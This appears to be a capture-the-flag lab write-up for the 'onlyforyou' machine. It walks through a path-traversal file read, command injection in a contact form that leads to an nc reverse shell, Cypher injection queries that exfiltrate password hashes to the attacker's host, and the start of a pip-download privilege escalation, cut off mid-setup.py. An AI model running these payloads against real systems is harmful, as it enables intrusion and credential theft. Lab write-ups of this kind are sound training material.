# onlyforyou

| Hostname   | Difficulty |
| ---        | ---        |
| onlyforyou |            |

Machine IP: 10.10.11.210 :

```bash
TARGET=10.10.11.210       # onlyforyou IP address
```

## Initial Reconnaissance

### Ports and services

```shell
# -p- : ports to scan. "-" is for all ports
NMAP_TARGET=$TARGET # target to scan
# -T4 : timing template (0(slower) to 5(faster) )
# -Pn : Treat all hosts as online -- skip host discovery
# --min-rate=1000 : Send packets no slower than <number> per second
NMAP_OUTPUT=$NMAP_TARGET-nmap-enumports # Save output to file(s)
nmap -p- $NMAP_TARGET -T4 -Pn --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 22:22 CEST
Nmap scan report for 10.10.11.210
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
```

Let's enumerate deeper these services :

```shell
PORTS=22,80 # ports to scan. "-" is for all ports. ex: 80,22
NMAP_TARGET=$TARGET # target to scan
# -T4 : 
# -Pn :
# --min-rate=1000 :
# -sC : 
# -sV : 
# -A :
NMAP_OUTPUT=$NMAP_TARGET-nmap-inspect # Save output to file(s)
nmap -p $PORTS -sC -sV -A $NMAP_TARGET -T4 --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 22:23 CEST
Nmap scan report for 10.10.11.210
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   24.39 ms 10.10.14.1
2   24.47 ms 10.10.11.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds

```

We have the hostname, we can add it to our hosts definition file :

```shell
echo "$TARGET    only4you.htb" >> /etc/hosts
```

### Web service

### Web Service

![[Pasted image 20230816222929.png]]

Enumerate sub domains on this web server (vhosts) :

```shell
wfuzz -c -H "Host: FUZZ.only4you.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "User-Agent: PENTEST" --hc 301,404,403 -u http://only4you.htb
```

```text
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://only4you.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000033:   200        51 L     145 W      2190 Ch     "beta"                       

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

So we have also http://beta.only4you.htb/ :

```shell
echo "$TARGET    only4you.htb beta.only4you.htb" >> /etc/hosts
```

![[Pasted image 20230816223248.png]]

At the top right, we have 2 links to resize or convert images :

![[Pasted image 20230816223342.png]]

![[Pasted image 20230816223355.png]]

The button "Source" will download a zip file "Source.zip", so we can extract its content :

```text
unzip source.zip
Archive:  source.zip
   creating: beta/
  inflating: beta/app.py
   creating: beta/static/
   creating: beta/static/img/
  inflating: beta/static/img/image-resize.svg
   creating: beta/templates/
  inflating: beta/templates/400.html
  inflating: beta/templates/500.html
  inflating: beta/templates/convert.html
  inflating: beta/templates/index.html
  inflating: beta/templates/405.html
  inflating: beta/templates/list.html
  inflating: beta/templates/resize.html
  inflating: beta/templates/404.html
   creating: beta/uploads/
   creating: beta/uploads/resize/
   creating: beta/uploads/list/
   creating: beta/uploads/convert/
  inflating: beta/tool.py
```

The main code  is `beta/app.py` : 

```python
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024
app.config['RESIZE_FOLDER'] = 'uploads/resize'
app.config['CONVERT_FOLDER'] = 'uploads/convert'
app.config['LIST_FOLDER'] = 'uploads/list'
app.config['UPLOAD_EXTENSIONS'] = ['.jpg', '.png']

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')

@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")

@app.route('/convert', methods=['POST', 'GET'])
def convert():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only jpg and png images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['CONVERT_FOLDER'], img))
            if ext == '.png':
                image = convertpj(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
            else:
                image = convertjp(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url) 
        return render_template('convert.html')
    else:
        [f.unlink() for f in Path(app.config['CONVERT_FOLDER']).glob("*") if f.is_file()]
        return render_template('convert.html')

@app.route('/source')
def send_report():
    return send_from_directory('static', 'source.zip', as_attachment=True)

@app.route('/list', methods=['GET'])
def list():
    return render_template('list.html')

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

And `beta/tool.py` :

```python
from flask import send_file, current_app
import os
from PIL import Image
from pathlib import Path

def convertjp(image):
    imgpath = os.path.join(current_app.config['CONVERT_FOLDER'], image)
    img = Image.open(imgpath)
    rgb_img = img.convert('RGB')
    file = os.path.splitext(image)[0] + '.png'
    rgb_img.save(current_app.config['CONVERT_FOLDER'] + '/' + file)
    return file

def convertpj(image):
    imgpath = os.path.join(current_app.config['CONVERT_FOLDER'], image)
    img = Image.open(imgpath)
    rgb_img = img.convert('RGB')
    file = os.path.splitext(image)[0] + '.jpg'
    rgb_img.save(current_app.config['CONVERT_FOLDER'] + '/' + file)
    return file

def resizeimg(image):
    imgpath = os.path.join(current_app.config['RESIZE_FOLDER'], image)
    sizes = [(100, 100), (200, 200), (300, 300), (400, 400), (500, 500), (600, 600), (700, 700)][::-1]
    img = Image.open(imgpath)
    sizeimg = img.size
    imgsize = []
    imgsize.append(sizeimg)
    for x,y in sizes:
        for a,b in imgsize:
            if a < x or b < y:
                [f.unlink() for f in Path(current_app.config['LIST_FOLDER']).glob("*") if f.is_file()]
                [f.unlink() for f in Path(current_app.config['RESIZE_FOLDER']).glob("*") if f.is_file()]
                return False
            else:
                img.thumbnail((x, y))
                if os.path.splitext(image)[1] == '.png':
                    pngfile = str(x) + 'x' + str(y) + '.png'
                    img.save(current_app.config['LIST_FOLDER'] + '/' + pngfile)
                else:
                    jpgfile = str(x) + 'x' + str(y) + '.jpg'
                    img.save(current_app.config['LIST_FOLDER'] + '/' + jpgfile)
    return True
```

## Initial access

### Exploitation

The function `download()` do not properly sanitize its input parameter. The code :

```python
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

The parameter `filename` is given as a parameter to `send_file()`. If this parameter is not properly sanitized, then this could allow an attacker to download files from the system.

```python
import posixpath, os
image='test.png'
filename = posixpath.normpath(image)
if '..' in filename or filename.startswith('../'):
    print('Hacking detected!', 'danger')

if not os.path.isabs(filename):
    # filename = os.path.join(app.config['LIST_FOLDER'], filename)
    filename = os.path.join('uploads/list', filename)
```

With `image='test.png'`, then `filename='uploads/list/test.png'`.
With `image='../../../test.png'`, then `Hacking detected! danger`.
With `image='/../../../test.png'`, then `filename='/test.png'`.
With `image='/etc/passwd'`, then `filename='/etc/passwd'`.

The test `if '..' in filename or filename.startswith('../'):` will forbid `..` in the path, but if we provide an absolute path, this work around the protections.

This can be tested with :

```shell
curl -v -X POST http://beta.only4you.htb/download --data 'image=/etc/passwd'
```

Result:

```text
*   Trying 10.10.11.210:80...
* Connected to beta.only4you.htb (10.10.11.210) port 80 (#0)
> POST /download HTTP/1.1
> Host: beta.only4you.htb
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Length: 17
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 17 out of 17 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 23 Aug 2023 21:28:47 GMT
< Content-Type: application/octet-stream
< Content-Length: 2079
< Connection: keep-alive
< Content-Disposition: attachment; filename=passwd
< Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
< Cache-Control: no-cache
< ETag: "1680178340.2049809-2079-393413677"
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
* Connection #0 to host beta.only4you.htb left intact
```

We can identify some users :

```shell
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

Since we are able to get a LFI, we can try to get most known files :

```shell
wget https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt -O file_inclusion_linux.txt

while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$p"
  curl -s http://beta.only4you.htb/download --data "image=$p"
done < file_inclusion_linux.txt > lfi_out.txt
```

We can find the nginx configuration file for this site

/etc/nginx/sites-enabled/default

```text
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

Thi provide the path of the main application: `/var/www/only4you.htb/`. Knowing the file structure of the beta application, we can read the code of this application :

```shell
curl -s http://beta.only4you.htb/download --data "image=/var/www/only4you.htb/app.py"
```

```python
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

From the imports, there is also a file `form.py` :

```shell
curl -s http://beta.only4you.htb/download --data "image=/var/www/only4you.htb/form.py"
```

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

We can identify a vulnerability that could allow an attacker to execute commands :

```python
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

Providing an email address, the domain of this address is used as a non-validated parameter to the dig command line, allowing a remote command execution.

A basic call would be :

```shell
curl http://only4you.htb/ --data 'email=test@domain.com' --data 'subject=test' --data 'message=Hello'
```

In order to test this RCE, we will make it call back our attack host.

Start a HTTP web server to receive the call :

```shell
python3 -m http.server 80
```

And execute the comand that include a payload in the domain of the email :

```shell
curl http://only4you.htb/ --data 'email=test@domain.com|curl http://10.10.14.14/evil.txt' --data 'subject=test' --data 'message=Hello'
```

As a result, we receive the call :

```shell
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [24/Aug/2023 23:36:38] code 404, message File not found
10.10.11.210 - - [24/Aug/2023 23:36:38] "GET /evil.txt HTTP/1.1" 404 -
```

Open a listener :

```shell
rlwrap -cAr nc -lvnp 4444
```

and get a reverse shell :

```shell
curl http://only4you.htb/ --data-urlencode 'email=test@domain.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f' --data 'subject=test' --data 'message=Hello'
```

And we get a shell :

```shell
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.210.
Ncat: Connection from 10.10.11.210:60812.
sh: 0: can't access tty; job control turned off
whoami
www-data
pwd
/var/www/only4you.htb
$ 
```

### Maintaining access

## Post-Exploitation

### Host Reconnaissance

```shell
ss -tlnp
```

```text
State    Recv-Q   Send-Q          Local Address:Port        Peer Address:Port   Process       
LISTEN   0        70                  127.0.0.1:33060            0.0.0.0:*                    
LISTEN   0        151                 127.0.0.1:3306             0.0.0.0:*                    
LISTEN   0        511                   0.0.0.0:80               0.0.0.0:*       users:(("ngin
x",pid=1048,fd=6),("nginx",pid=1047,fd=6))
LISTEN   0        4096            127.0.0.53%lo:53               0.0.0.0:* 
LISTEN   0        4096            127.0.0.53%lo:53               0.0.0.0:*                              LISTEN   0        128                   0.0.0.0:22               0.0.0.0:*                              LISTEN   0        4096                127.0.0.1:3000             0.0.0.0:*                              LISTEN   0        2048                127.0.0.1:8001             0.0.0.0:*                              LISTEN   0        4096       [::ffff:127.0.0.1]:7687                   *:*                              LISTEN   0        50         [::ffff:127.0.0.1]:7474                   *:*                              LISTEN   0        128                      [::]:22                  [::]:* 
```

When scanning with nmap, we had only ports 22 (SSH) and 80(HTTP).

We now have access to ports 3000, 8001, 7687, and 7474.



cp /opt/my-resources/chisel/linux_amd64/chisel_linux_amd64 .
python3 -m http.server 80

chisel server -p 8080 --socks5 --reverse


cd /tmp
wget http://10.10.14.10/chisel_linux_amd64 -O chisel
chmod +x ./chisel
./chisel client 10.10.14.10:8080 R:3000:localhost:3000 R:8001:localhost:8001 R:7687:localhost:7687 R:7474:localhost:7474

http://localhost:3000/

![[Pasted image 20230901205401.png]]

http://localhost:8001/

redirect to a login page :

http://localhost:8001/login

![[Pasted image 20230901205458.png]]

We can guess a gredential to login :

admin:admin

![[Pasted image 20230901212859.png]]

![[Pasted image 20230901213326.png]]

http://localhost:7474/

redirect to :

http://localhost:7474/browser/

![[Pasted image 20230901205533.png]]

So the application on port port 8001 is using the Neo4j database on port 7687. This database have a web front on port 7474.

On Hacktricks, we have a possible "Cypher Injection (neo4j)" : https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j

Since the web application is using the database, there could be an injection point.

The side menu (buger button) offer only 3 pages :

![[Pasted image 20230901220812.png]]

The Employee page is a form :

![[Pasted image 20230901220850.png]]

Whenb using this search form :

![[Pasted image 20230901222234.png]]

From Hacktricks, there a query to get server version :

```shell
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.10/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

we can insert this query in the web form, and have a HTTP server

python3 -m http.server 80

```text
10.10.11.210 - - [01/Sep/2023 22:45:31] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [01/Sep/2023 22:45:31] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```

So we can exfiltrate data from this Neo4j database

We can get labels :

```text
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.10/?l='+label as l RETURN 0 as _0 //
```

```text
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:57] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:58] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:58] "GET /?l=employee HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:58] "GET /?l=user HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:02:58] "GET /?l=employee HTTP/1.1" 200 -
```

The label "user" could be interesting

```text
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.10/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

```text
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:58] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [01/Sep/2023 23:18:59] "GET /?username=john HTTP/1.1" 200 -
```

we have 2 users with hashes :

| username | hash                                                             |
| -------- | ---------------------------------------------------------------- |
| john     | 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 |
| admin    | a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 |

On https://crackstation.net/ we can reverse theses hashes :

| Hash                                                             | Type   | Result     |
| ---------------------------------------------------------------- | ------ | ---------- |
| 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 | sha256 | admin      |
| a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 | sha256 | ThisIs4You |


Using 
john:ThisIs4You

we can open a SSH session to the host

ssh john@only4you.htb


### Privilege Escalation

sudo -l
```
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

On port 3000 there is the gog web application. this sudo application 

With the SSH access, we can open a tunnel :
ssh john@only4you.htb -L 3000:localhost:3000

http://localhost:3000/

Using john's credential, we can login :

![[Pasted image 20230903212725.png]]

There is only a project called "Test" :

![[Pasted image 20230903212928.png]]

We are able to insert a new file.

In order to use sudo and to escalade privileges, we would need to call `pip download` :

```shell
pip3 download http://127.0.0.1:3000/*.tar.gz
```

So we can use this space to insert a file .tar.gz and use `pip download`.

Searching for a vulnerability ("pip download tar.gz vulnerability"), leads to some interesting pages :
- https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/
- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/

And a repository: https://github.com/wunderwuzzi23/this_is_fine_wuzzi

Even if `pip download` aim downloading archive, if this archive contains a `setup.py`, this file would be executed. Since we execute this command with `sudo`, this would lead to executing code with higher privileges.

In order to build a python package, we can use the documentation: https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/

We can find several tutorials on creating a simple python package:
- https://dzone.com/articles/executable-package-pip-install
- https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/
- https://www.tutorialsteacher.com/python/python-package
- https://www.blog.pythonlibrary.org/2021/09/23/python-101-how-to-create-a-python-package/

We have some pre-requisites:

pip install setuptools
pip install build

We have to create a few files :

- `README.md`
- `setup.py`
- `packagename/__init__.py`

```
PACKAGE_NAME="mytest"
mkdir ${PACKAGE_NAME}
cd ${PACKAGE_NAME}
echo "test" > README.md
mkdir ${PACKAGE_NAME}
touch ${PACKAGE_NAME}/__init__.py
```

setup.py :

```python
import setuptools
with open("README.md", "r") as fh:
    long_description = fh.read()
setuptools.setup(
    name="mytest",
    version="0.0.1",
    author="John Doe",
    author_email="john@example.com",
    description="A simple package",
    long_description=long_description,
